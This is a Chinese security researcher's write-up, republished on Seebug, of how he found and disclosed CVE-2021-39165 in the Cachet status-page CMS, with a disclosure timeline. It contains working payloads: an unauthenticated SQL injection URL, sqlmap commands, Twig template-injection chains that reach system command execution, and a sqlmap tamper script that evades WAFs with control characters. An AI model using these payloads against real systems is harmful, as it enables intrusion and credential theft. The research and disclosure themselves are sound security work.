**作者：phith0n  
原文链接：<https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html>**

> 事先声明：本次测试过程完全处于本地或授权环境，仅供学习与参考，不存在未授权测试过程。本文提到的漏洞《Cachet
> SQL注入漏洞（CVE-2021-39165）》已经修复，也请读者勿使用该漏洞进行未授权测试，否则作者不承担任何责任

## 0x01 故事的起源

一个百无聊赖的周日晚上，我在知识星球闲逛，发现有一个匿名用户一连向我提出了两个问题：

![](https://images.seebug.org/content/images/2021/08/3c8c5656-3c54-4e1a-9ed6-43c24f92ef40.png-w331s)

本来不是很想回答这两个问题，一是感觉比较基础，二是现在大部分人都卷Java去了，关注PHP的其实不多。不过我搜索了一下自己的星球，发现我的确没有讲过如何调试PHP代码，那么回答一下这个问题也未尝不可。

既然如此，我就打开自己常用的PHP
IDE之一PHPStorm（另一款是VSCode），看了看硬盘里落满灰尘的PHP代码，要不就是几年前的版本要不就是没法做演示的非开源项目。如果要新写一篇教程，最好还是上网上找个新的CMS做演示。

于是我打开了Github，搜索“PHP”关键字，点进了PHP这个话题。PHP话题下有几类开源项目，一是一些PHP框架和库，排在前面的主要是Laravel、symfony、Yii、guzzle、PHPMailer、composer等；二是CMS和网站应用，排在前面的有matomo、nextcloud、monica、Cachet等；三是一些README和教学项目，比如awesome-php、DesignPatternsPHP等。

做演示自然选择开箱即用的第二类，于是我挑了一个功能常见且简单的Cachet。

当天晚上我自己搭建、调试、运行起了Cachet这个CMS，并写了一篇简单的教程发在星球里：

![](https://images.seebug.org/content/images/2021/08/46c88022-80da-4a9c-aec0-8223e27c1369.png-w331s)

本来这个故事到此就结束了，但是不安分的我当时就在想，既然搭都搭起来了，那不如就对其做一遍审计吧。

## 0x02 Cachet代码审计

Cachet是一款基于Laravel框架开发的状态页面（Statuspage）系统。Statuspage是云平台流行后慢慢兴起的一类系统，作用是向外界展示当前自己各个服务是否在正常运行。国外很多大型互联网平台都有Statuspage，最著名的有
Github、Twitter、Facebook、Amazon AWS等。

Statuspage中占据领导地位的是Statuspage.io，隶属于Atlassian。但毕竟这是一个付费的系统，Cachet得益于自己开源的优势，也有不少拥趸，在Github上有12k多关注。

Cachet最新的稳定版本是2.3.18，基于Laravel 5.2开发，我将其拉下来安装好后开始审计。

> 经过验证，dev版本的代码可能有所差异（主要是后台getshell部分的POC利用链不一样），本文仅基于稳定版做审计。

Laravel框架的CMS审计，我主要关注下面几个点：

  * 网站路由
  * 控制器（app/Http/Controllers）
  * 中间件（app/Http/Middleware）
  * Model（app/Models）
  * 网站配置（config）
  * 第三方扩展（composer.json）

先从路由开始看起，以`app/Http/Routes/StatusPageRoutes.php`为例：

    
    
    $router->group(['middleware' => ['web', 'ready', 'localize']], function (Registrar $router) {
        $router->get('/', [
            'as'   => 'status-page',
            'uses' => 'StatusPageController@showIndex',
        ]);
    
        $router->get('incident/{incident}', [
            'as'   => 'incident',
            'uses' => 'StatusPageController@showIncident',
        ]);
    
        $router->get('metrics/{metric}', [
            'as'   => 'metrics',
            'uses' => 'StatusPageController@getMetrics',
        ]);
    
        $router->get('component/{component}/shield', 'StatusPageController@showComponentBadge');
    });

其中可以看出的信息是：

  * 某个path所对应的Controller和方法
  * 整个模块使用的中间件

前者比较好理解，中间件的作用通常是做权限的校验、全局信息的提取等。这个route组合用了三个中间件web、ready和localize。我们可以在app/Http/Kernel.php找到这三个名字对应的中间件类，他们的作用是：

  * web是多个中间件的组合，作用主要是设置Cookie和session、校验csrf token等
  * ready用于检查当前CMS是否有初始化，如果没有，则跳到初始化的页面
  * localize主要用于根据请求中的Accept-Language来展示不同语言的页面

接着我会主要关注那些不校验权限的Controller（就是没有admin和auth中间件的Controller）。我关注到了app/Http/Controllers/Api/ComponentController.php的getComponents方法：

    
    
    /**
      * Get all components.
      *
      * @return \Illuminate\Http\JsonResponse
      */
    public function getComponents()
    {
        if (app(Guard::class)->check()) {
            $components = Component::query();
        } else {
            $components = Component::enabled();
        }
    
        $components->search(Binput::except(['sort', 'order', 'per_page']));
    
        if ($sortBy = Binput::get('sort')) {
            $direction = Binput::has('order') && Binput::get('order') == 'desc';
    
            $components->sort($sortBy, $direction);
        }
    
        $components = $components->paginate(Binput::get('per_page', 20));
    
        return $this->paginator($components, Request::instance());
    }

其中有两个关键点：

  * `$components->search(Binput::except(['sort', 'order', 'per_page']));`
  * `$components->sort($sortBy, $direction);`

sort和search方法都不是Laravel自带的Model方法，这种情况一般是自定义的scope。scope是定义在Model中可以被重用的方法，他们都以`scope`开头。我们可以在app/Models/Traits/SortableTrait.php中找到scopeSort方法：

    
    
    trait SortableTrait
    {
        /**
         * Adds a sort scope.
         *
         * @param \Illuminate\Database\Eloquent\Builder $query
         * @param string                                $column
         * @param string                                $direction
         *
         * @return \Illuminate\Database\Eloquent\Builder
         */
        public function scopeSort(Builder $query, $column, $direction)
        {
            if (!in_array($column, $this->sortable)) {
                return $query;
            }
    
            return $query->orderBy($column, $direction);
        }
    }

`$column`经过了`in_array`的校验，`$direction`传入的是bool类型，这两者均无法传入恶意参数。

我们再看看scopeSearch方法，在app/Models/Traits/SearchableTrait.php中：

    
    
    <?php
    trait SearchableTrait
    {
        /**
         * Adds a search scope.
         *
         * @param \Illuminate\Database\Eloquent\Builder $query
         * @param array                                 $search
         *
         * @return \Illuminate\Database\Eloquent\Builder
         */
        public function scopeSearch(Builder $query, array $search = [])
        {
            if (empty($search)) {
                return $query;
            }
    
            if (!array_intersect(array_keys($search), $this->searchable)) {
                return $query;
            }
    
            return $query->where($search);
        }
    }

Cachet在调用search时传入的是`Binput::except(['sort', 'order',
'per_page'])`，这个返回值是将用户完整的GPC输入除掉sort、order、per_page三个key组成的数组。也就是说，传入scopeSearch的这个`$search`数组的键、值都是用户可控的。

不过，可见这里使用了`array_intersect`函数对`$search`数组进行判断，如果返回为false，则不会继续往下执行。

大概看了一圈Cachet的代码，没有太多功能点。总结起来它的特点是：

**1.有一部分代码逻辑在Controller中，但其还有大量逻辑放在CommandHandler中。**

  * “Commands & Handlers”逻辑用于在Laravel中实现命令模式 
  * 这个设计模式分割了输入和逻辑操作（Source和Sink），让代码审计变得麻烦了许多 

**2.整站前台的功能很少，权限检查在中间件中，配置如下**

  * 前台和API中的读取操作（GET）不需要用户权限
  * API中的写入操作（POST、PUT、DELETE）需要用户权限
  * 后台所有操作都需要用户权限

**3.一些特殊操作都会经过逻辑判断，比如上文说到的两个操作，作者相对比较有安全意识**

**4.Cachet默认使用Laravel-Binput做用户输入，而这个库对主要是用于做安全过滤，但这个过滤操作也为后面实战中绕过WAF提供了极大帮助**

相信大家审计中经常会遇到类似情况，前台功能很少导致进展不下去，那么多看看框架部分的代码也许能发现一些问题。

遇到困难不要慌，去冰箱里拿了一瓶元气森林冷静冷静，重新回来看代码。回看前面的scopeSearch方法，我突然发现了问题：

    
    
    if (!array_intersect(array_keys($search), $this->searchable)) {
        return $query;
    }
    
    return $query->where($search);

`array_intersect`这个函数，他的功能是计算两个输入数组的 **交集**
，乍一看这里处理好像经过了校验，用户输入的数组的key如果不在`$this->searchable`中，就无法取到交集。

但是可以想象一下，我的输入中只要有一个key在`$this->searchable`中，那么这里的交集就可以取到至少一个值，这个if语句就不会成立。所以，这个检查形同虚设，用户输入的数组`$search`被完整传入`where()`语句中。

## 0x03 Laravel代码审计

熟悉Laravel的同学对`where()`应该不陌生，简单介绍一下用法。我们可以通过传入两个参数key和value，来构造一个WHERE条件：

    
    
    DB::table('dual')->where('id', 1);
    // 生成的WHERE条件是：WHERE id = 1

如果传入的是三个参数，则第二个参数会认为是条件表达式中的符号，比如：

    
    
    DB::table('dual')->where('id', '>', 18);
    // 生成的WHERE条件是：WHERE id > 18

当然where也是支持传入数组的，我看可以将多个条件组合成一个数组传入where函数中，比如：

    
    
    DB::table('dual')->where([
        ['id', '>', '18'],
        ['title', 'LIKE', '%example%']
    ]);
    // 生成的WHERE条件是：WHERE id > 18 AND title LIKE '%example%'

那么，思考下面三个代码在Laravel中是否可能导致SQL注入：

  * `where($input, '=', 1)` 当where的第一个参数被用户控制
  * `where('id', $input, 1)` 当where的第二个参数被用户控制，且存在第三个参数
  * `where($input)` 当where只有一个参数且被用户控制

这三个代码对应着不同情况，第一种是key被控制，第二种是符号被控制，第三种是整个条件都被控制。

测试的过程就不说了，经过测试，我获取了下面的结果：

  * 当第一个参数key可控时，传入任意字符串都会报错，具体的错误为“unknown column”，但类似反引号、双引号这样的定界符将会被转义，所以无法逃逸出field字段进行注入
  * 当第二个参数符号可控时，输入非符号字符不会有任何报错，也不存在注入
  * 当整体可控时，相当于可以传入多个key、符号和value，但经过前两者的测试，key和符号位都是不能注入的，value就更不可能

仿佛又陷入了困境。

我尝试debug进入`where()`函数看了看它内部的实现，`src/Illuminate/Database/Query/Builder.php`：

    
    
    public function where($column, $operator = null, $value = null, $boolean = 'and')
    {
        // If the column is an array, we will assume it is an array of key-value pairs
        // and can add them each as a where clause. We will maintain the boolean we
        // received when the method was called and pass it into the nested where.
        if (is_array($column)) {
            return $this->addArrayOfWheres($column, $boolean);
        }
        // ...
        // If the given operator is not found in the list of valid operators we will
        // assume that the developer is just short-cutting the '=' operators and
        // we will set the operators to '=' and set the values appropriately.
        if (! in_array(strtolower($operator), $this->operators, true) &&
            ! in_array(strtolower($operator), $this->grammar->getOperators(), true)) {
            list($value, $operator) = [$operator, '='];
        } 

当第一个参数是数组时，将会执行到`addArrayOfWheres()`方法。另外从上面的第二个if语句也可以看出，这里面对参数`$operator`做了校验，这也是其无法注入的原因。

跟进一下`addArrayOfWheres()`方法：

    
    
    protected function addArrayOfWheres($column, $boolean, $method = 'where')
    {
        return $this->whereNested(function ($query) use ($column, $method) {
            foreach ($column as $key => $value) {
                if (is_numeric($key) && is_array($value)) {
                    call_user_func_array([$query, $method], $value);
                } else {
                    $query->$method($key, '=', $value);
                }
            }
        }, $boolean);
    }
    
    public function whereNested(Closure $callback, $boolean = 'and')
    {
        $query = $this->forNestedWhere();
    
        call_user_func($callback, $query);
    
        return $this->addNestedWhereQuery($query, $boolean);
    }

可以观察到，这里面有个很重要的回调，遍历了用户输入的第一个数组参数`$column`，当发现其键名是一个数字，且键值是一个数组时，将会调用`[$query,
$method]`，也就是`$this->where()`，并将完整的`$value`数组作为参数列表传入。

这个过程就是为了实现上面说到的`where()`的第三种用法：

    
    
    DB::table('dual')->where([    ['id', '>', '18'],    ['title', 'LIKE', '%example%']]);

所以，通过这个方法，我可以做到了一件事情： **从控制`where()`的第一个参数，到能够完整控制`where()`的所有参数**。

那么，再回看where函数的参数列表：

    
    
    public function where($column, $operator = null, $value = null, $boolean = 'and')

第四个`$boolean`参数就格外显眼了，这是控制WHERE条件连接逻辑的参数，默认是and。这个`$boolean`既不是SQL语句中的“键”，也不是SQL语句中的“值”，而就是SQL语句的代码，如果没有校验，一定存在SQL注入。

事实证明，这里并没有经过校验。我将debug模式打开，并注释了抑制报错的逻辑，即可在页面上看到SQL注入的报错：

![](https://images.seebug.org/content/images/2021/08/400220c8-d286-47ee-9ba4-9d0bb1c79e5d.png-w331s)

`1[3]`参数可以注入任何语句，所以这里存在一个SQL注入漏洞。而且因为这个API接口是GET请求，所以无需用户权限，这是一个无限制的前台SQL注入。

Laravel的这个数组特性可以类比于6年前我第一次发现的ThinkPHP3系列SQL注入。当时的ThinkPHP注入是我在乌云乃至安全圈站稳脚跟的一批漏洞，它开创了使用数组进行框架ORM注入的先河，其影响和其后续类似的漏洞也一直持续到今天。遗憾的是，Laravel的这个问题是出现在`where()`的第一个参数，官方并不认为这是框架的问题。

## 0x04 SQL注入利用

回到Cachet。默认情况下Cachet的任何报错都不会有详情，只会返回一个500错误。且Laravel不支持堆叠注入，那么要利用这个漏洞，就有两种方式：

  * 通过UNION SELECT注入直接获取数据
  * 通过BOOL盲注获取数据

UNION肯定是最理想的，但是这里无法使用，原因是用户的这个输入会经过两次字段数量不同的SQL语句，会导致其中至少有一个SQL语句在UNION
SELECT的时候出错而退出。

Bool盲注没有任何问题，我本地是Postgres数据库，所以以其为例。

构造一个能够显示数据的请求：

    
    
    http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)+--+

![](https://images.seebug.org/content/images/2021/08/efb07cc3-07db-428c-bf1f-d2c743c83f81.png-w331s)

将and 1=1修改为and 1=2，数据消失了：

    
    
    http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=2)+--+

![](https://images.seebug.org/content/images/2021/08/7e1df53e-b2a3-45b0-b403-e019a6548ad8.png-w331s)

说明盲注可以利用，于是我选择使用SQLMap来利用漏洞。SQLMap默认情况下将整个参数替换成SQL注入的Payload，而这个注入点需要前缀和后缀，需要对参数进行修改。

我先使用一个能够爆出数据的URL，比如`/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)+--+`，在这个括号后面增加个星号，然后作为`-u`目标进行检测即可：

    
    
    python sqlmap.py -u "http://127.0.0.1:8080/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"

![](https://images.seebug.org/content/images/2021/08/43d2e6cc-3c0c-4509-b09e-7210ca7fb13e.png-w331s)

注入点被SQLMap识别了。因为表结构已经知道，成功获取用户、密码：

![](https://images.seebug.org/content/images/2021/08/45010335-a792-44c6-a8d2-e826f5c3f9b6.png-w331s)

## 0x05 后台代码审计

这个注入漏洞的优势是无需用户权限，但劣势是无法堆叠执行，原因我在星球的这篇帖子里有介绍过（虽然帖子里说的是ThinkPHP）。主要是在初始化PDO的时候设置了`PDO::ATTR_EMULATE_PREPARES`为false，而数据库默认的参数化查询不允许prepare多个SQL语句。

无法堆叠执行的结果就是没法执行UPDATE语句，我只能通过注入获取一些信息，想要进一步执行代码，还需要继续审计。

接下来的审计我主要是在看后台逻辑，挖掘后台漏洞建议是黑盒结合白盒，这样会更快，原因是后台可能有很多常见的敏感操作，比如文件上传、编辑等，这些操作有时候可能直接抓包一改就能测出漏洞，都不需要代码审计了。

Cachet的后台还算相对安全，没有文件操作的逻辑，唯一一个上传逻辑是“Banner Image”的修改，但并不存在漏洞。

这时候我关注到了一个功能，Incident Templates，用于在报告事故的时候简化详情填写的操作。这个功能支持解析Twig模板语言：

![](https://images.seebug.org/content/images/2021/08/b34a4e49-b493-4b3f-a03f-ff5abe22e315.png-w331s)

对于Twig模板的解析是在API请求中，用API创建或编辑Incident对象的时候会使用到Incident Templates，进而执行模板引擎。

利用时需要现在Web后台添加一个Incident
Template，填写好Twig模板，记下名字。再发送下面这个数据包来执行名为“ssti”的模板，获得结果：

    
    
    POST /api/v1/incidents HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    X-Cachet-Token: QLGMRm5N8bUjVxbdLF6m
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 42
    
    visible=0&status=1&name=demo&template=ssti

其中X-Cachet-Token是注入时获取的用户的API Key。我添加了一个内容是`{{ 233 * 233 }}`的Incident
Template，渲染结果被成功返回在API的结果中：

![](https://images.seebug.org/content/images/2021/08/d9c7fed8-98e8-416c-a074-508730a9e705.png-w331s)

Twig是PHP的一个著名的模板引擎，相比于其他语言的模板引擎，它提供了更安全的沙盒模式。默认模式下模板引擎没有特殊限制，而沙盒模式下只能使用白名单内的tag和filter。

Cachet中没有使用沙盒模式，所以我不做深入研究。普通模式想要执行恶意代码，需要借助一些内置的tag、filter，或者上下文中的危险对象。在Twig
v1.41、v2.10和v3后，增加了`map`和`filter`这两个filter，可以直接用来执行任意函数：

    
    
    {{["id"]|filter("system")|join(",")}}
    {{["id"]|map("system")|join(",")}}

但是Cachet v2.3.18中使用的是v1.40.1，刚好不存在这两个filter。那么旧版本如何来利用呢？

PortSwigger曾在2015年发表过一篇模板注入的文章《Server-Side Template
Injection》，里面介绍过当时的Twig模板注入方法：

    
    
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

`_self`是Twig中的一个默认的上下文对象，指代的是当前Template，其中的`env`属性是一个`Twig_Environment`对象。`Twig_Environment`类的`registerUndefinedFilterCallback`和`getFilter`就用来注册和执行回调函数，通过这两次调用，即可构造一个任意命令执行的利用链。

但是，这个执行命令的方法在Twig
v1.20.0中被官方修复了：https://github.com/twigphp/Twig/blob/1.x/CHANGELOG#L430，修复方法是发现object是当前对象时，则不进行属性的获取，下面这个if语句根本不会进去：

    
    
    // object property
    if (self::METHOD_CALL !== $type && !$object instanceof self) { // Twig_Template does not have public properties, and we don't want to allow access to internal ones
        if (isset($object->$item) || array_key_exists((string) $item, $object)) {
            if ($isDefinedTest) {
                return true;
            }
    
            if ($this->env->hasExtension('sandbox')) {
                $this->env->getExtension('sandbox')->checkPropertyAllowed($object, $item);
            }
    
            return $object->$item;
        }
    }

这个修改逻辑是科学的，因为Twig中正常只允许访问一个对象的public属性和方法，但因为`_self`指向的是`$this`，而`$this`可以访问父类的protected属性，所以才绕过了对作用域的限制，访问到了`env`。这个修复对此作了加强，让`_self`的表现和其他对象相同了。

另外，`_self.getEnvironment()`原本也可以访问`env`，这个修复也一起被干掉了。

Cachet使用rcrowe/twigbridge来将twig集成进Laravel框架，按照composer.lock中的版本号来肯定高于v1.20.0（实际是v1.40.1），也就是说，我也无法使用这个Payload做命令执行。

## 0x06 寻找Twig利用链与代码执行

Cachet中使用了下面这段代码来渲染Twig模板：

    
    
    protected function parseIncidentTemplate($templateSlug, $vars)
    {
        if ($vars === null) {
            $vars = [];
        }
    
        $this->twig->setLoader(new Twig_Loader_String());
        $template = IncidentTemplate::forSlug($templateSlug)->first();
    
        return $this->twig->render($template->template, $vars);
    }

其中`$vars`是用户从POST中传入的一个数组，这意味着注入到模板中的变量只是简单的字符串数组，没有任何对象。再加上前文说到的`_self`对象也被限制了，我发现很难找到可以被利用的方法。

此时我关注到了rcrowe/twigbridge这个库。rcrowe/twigbridge用于在Laravel和Twig之间建立一个桥梁，让Laravel框架可以直接使用twig模板引擎。

根据Laravel的依赖注入、控制反转的设计模式，如果要实现“桥梁”的功能，那么就需要编写一个Service Provider，在Service
Provider中对目标对象进行初始化，并放在容器中。

我在rcrowe/twigbridge的ServiceProvider中下了断点，捋了捋Twig初始化的过程，发现一个有趣的点：

![](https://images.seebug.org/content/images/2021/08/711b0043-6170-484b-a5b3-9be3d9e0e6e7.png-w331s)

`baseTemplateClass`不是默认的`\Twig\Template`，而是一个自定义的`TwigBridge\Twig\Template`。`baseTemplateClass`就是在模板中，`_self`指向的那个对象的基类，是一个很重要的类。

在src/Twig/Template.php中，我发现`$context`中有一个看起来很特殊的对象`__env`：

    
    
    /**
     * {@inheritdoc}
     */
    public function display(array $context, array $blocks = [])
    {
        if (!isset($context['__env'])) {
            $context = $this->env->mergeShared($context);
        }
    
        if ($this->shouldFireEvents()) {
            $context = $this->fireEvents($context);
        }
    
        parent::display($context, $blocks);
    }

在此处下断点可以看到，这个`__env`是一个`\Illuminate\View\Factory`对象，原来是Twig共享了Laravel原生View模板引擎中的全局变量。

那么，我们可以找找`\Illuminate\View\Factory`类中是否有危险属性和函数。`\Illuminate\Events\Dispatcher`是Factory类的属性，其中存在一对事件监听函数：

    
    
    public function listen($events, $listener, $priority = 0)
    {
        foreach ((array) $events as $event) {
            if (Str::contains($event, '*')) {
                $this->setupWildcardListen($event, $listener);
            } else {
                $this->listeners[$event][$priority][] = $this->makeListener($listener);
    
                unset($this->sorted[$event]);
            }
        }
    }
    
    public function fire($event, $payload = [], $halt = false)
    {
        // ...
    
        foreach ($this->getListeners($event) as $listener) {
            $response = call_user_func_array($listener, $payload);

它的限制主要是，回调函数必须是一个可以被自动创建与初始化的类方法，比如静态方法。我很快我找到了一对合适的回调`\Symfony\Component\VarDumper\VarDumper`，我们可以先调用setHandler将`$handler`设置成任意函数，再调用`dump`来执行：

    
    
    class VarDumper
    {
        private static $handler;
    
        public static function dump($var)
        {
            // ...
            return call_user_func(self::$handler, $var);
        }
    
        public static function setHandler(callable $callable = null)
        {
            $prevHandler = self::$handler;
            self::$handler = $callable;
    
            return $prevHandler;
        }
    }

构造出的模板代码如下，成功执行任意命令：

    
    
    {{__env.getDispatcher().listen('ssti1', '\\Symfony\\Component\\VarDumper\\VarDumper@setHandler')}}
    {% set a = __env.getDispatcher().fire('ssti1', ['system']) %}
    {{__env.getDispatcher().listen('ssti2', '\\Symfony\\Component\\VarDumper\\VarDumper@dump')}}
    {% set a = __env.getDispatcher().fire('ssti2', ['ping -n 1 127.0.0.1']) %}

![](https://images.seebug.org/content/images/2021/08/57cd511a-d76c-44a7-bcbc-cb6ad2440281.png-w331s)

除了`__env`外，上下文中还被注入了一个`app`变量，这是一个`\Illuminate\Foundation\Application`对象，它的利用链就更简单了，因为其中有一个函数可以直接用来执行任意代码：

    
    
    public function call($callback, array $parameters = [], $defaultMethod = null)
    {
        if ($this->isCallableWithAtSign($callback) || $defaultMethod) {
            return $this->callClass($callback, $parameters, $defaultMethod);
        }
    
        $dependencies = $this->getMethodDependencies($callback, $parameters);
    
        return call_user_func_array($callback, $dependencies);
    }

所以，我构造了一个模板代码来执行任意PHP函数，这个方法相对简单很多：

    
    
    {{ app.call('md5', ['123456']) }}

至此，我又搞定了后台代码执行。两个漏洞组合起来，就可以成功拿下Cachet系统权限。

## 0x07 走向Bug Bounty

前面说过，国外大量大厂都会使用Statuspage，所以我跑了一下hackerone、bugcrowd中使用了Cachet系统的厂商：

![](https://images.seebug.org/content/images/2021/08/afa24b95-45d4-4044-aef3-7b0a23e676e9.png-w331s)

不多，大部分厂商还是在用Statuspage.io。

在实战中，我遇到了一个比较棘手的问题，大量厂商使用了WAF，这让GET型的注入变得很麻烦。解决这个问题的方法还是回归到代码审计中，Cachet获取用户输入是使用graham-campbell/binput，我在前面审计的时候发现其在获取输入的基础上会做一次过滤：

    
    
    public function get($key, $default = null, $trim = true, $clean = true)
    {
        $value = $this->request->input($key, $default);
    
        return $this->clean($value, $trim, $clean);
    }

跟进`clean()`我发现这个库最终对用户的输入做了一次处理：

    
    
    protected function process($str)
    {
        $str = $this->removeInvisibleCharacters($str);
        //...
    }
    
    protected function removeInvisibleCharacters($str, $urlEncoded = true)
    {
        $nonDisplayables = [];
    
        if ($urlEncoded) {
            $nonDisplayables[] = '/%0[0-8bcef]/';
            $nonDisplayables[] = '/%1[0-9a-f]/';
        }
    
        $nonDisplayables[] = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S';
    
        do {
            $str = preg_replace($nonDisplayables, '', $str, -1, $count);
        } while ($count);
    
        return $str;
    }

`removeInvisibleCharacters()`方法将输入中的所有控制字符给替换成空了。那么，这个特性可以用于绕过WAF。

正常的注入语句会被WAF拦截：

![](https://images.seebug.org/content/images/2021/08/37448e02-737a-4772-8231-255eece6aa40.png-w331s)

在关键字`OR`中间插入一个控制字符`%01`，即可绕过WAF正常注入了：

![](https://images.seebug.org/content/images/2021/08/10fc263e-1619-4255-b6e4-e0056e22603f.png-w331s)

我写了一个简单的SQLMap Tamper来帮我进行这个处理：

    
    
    #!/usr/bin/env python
    
    import re
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.LOWEST
    KEYWORD_PATTERN = re.compile(r'\b[a-zA-Z]{2,}\b')
    
    def dependencies():
        pass
    
    def tamper(payload, **kwargs):
        """
        Add %01 to all the keyword
    
        >>> tamper("1 AND '1'='1")
        "1 A%01ND '1'='1"
        """
    
        payload_list = list(payload)
        offset = 0
        for g in KEYWORD_PATTERN.finditer(payload):
            start = g.start()
            end = g.end()
            m = (start + end) // 2
    
            payload_list.insert(offset + m, '%01')
            offset += 1
    
        return ''.join(payload_list)

使用这个tamper：

    
    
    python sqlmap.py -u "https://target/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=o%02r+%27a%27=%3F%20a%01nd%201=1)*+--+" --tamper addinvisiblechars.py -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"

简单提交了几个有Bug Bounty的厂商，均已得到了确认：

![](https://images.seebug.org/content/images/2021/08/0b85ed78-3ab2-43b9-ab52-34c7765aea59.png-w331s)

![](https://images.seebug.org/content/images/2021/08/808ef833-d065-4f0d-b18f-10705efcd498.png-w331s)

![](https://images.seebug.org/content/images/2021/08/6f85f107-c619-49ec-8e41-4aa3223287e9.png-w331s)

![](https://images.seebug.org/content/images/2021/08/7a77e643-f9dd-4430-a287-6b4926e02158.png-w331s)

## 漏洞时间线

本文涉及的漏洞已经提交给Cachet官方，但是官方开发者不是很活跃，一直没有回应。在issue中找到了一个fork的厂商，相对比较活跃，也可以联系到维护人，于是以fork厂商的身份对漏洞进行了通报。

以下是漏洞的生命时间线：

  * Jul 19, 2021 - 漏洞发现
  * Jul 20, 2021 - SQL注入提交给Laravel官方，Laravel并不认为是自己的问题
  * Jul 19 ~ jul 30, 2021 - 对hakcerone、bugcrowd上的厂商进行测试，并提交漏洞
  * Jul 27, 2021 - 漏洞提交给Cachet官方和Fork的维护者
  * Jul 27, 2021 - 发现Fork的项目在此之前意外修复过这个漏洞
  * Aug 27, 2021, 01:36 AM GMT+8 - 漏洞公告发布，确认编号CVE-2021-39165

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1688/>

